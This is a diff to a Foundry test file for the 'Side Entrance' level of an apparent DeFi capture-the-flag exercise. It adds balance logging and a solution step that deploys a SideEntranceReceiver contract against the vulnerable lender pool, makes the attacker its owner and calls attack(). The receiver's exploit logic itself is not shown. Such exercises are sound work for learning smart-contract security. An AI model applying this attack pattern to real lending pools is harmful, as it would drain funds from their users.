@@ -5,6 +5,7 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceReceiver} from "./SideEntranceReceiver.sol";
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -28,6 +29,9 @@ contract SideEntrance is Test {
         assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);
 
         attackerInitialEthBalance = address(attacker).balance;
+        console.log("The initial balance of attacker: %s ether", attackerInitialEthBalance / 1e18);
+
+        console.log("The final balance of attacker: %s ether", address(attacker).balance / 1e18);
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
@@ -40,6 +44,15 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT END *
          */
+        // vm.prank(attacker);
+        // SideEntranceReceiver sideEntranceReceiver = new SideEntranceReceiver(address(sideEntranceLenderPool));
+        // sideEntranceReceiver.attack();
+
+        SideEntranceReceiver sideEntranceReceiver = new SideEntranceReceiver(address(sideEntranceLenderPool));
+        vm.label(address(sideEntranceReceiver), "Side Entrance Receiver");
+        sideEntranceReceiver.setOwner(attacker); // Set the owner of the SideEntranceReceiver contract
+        sideEntranceReceiver.attack();
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
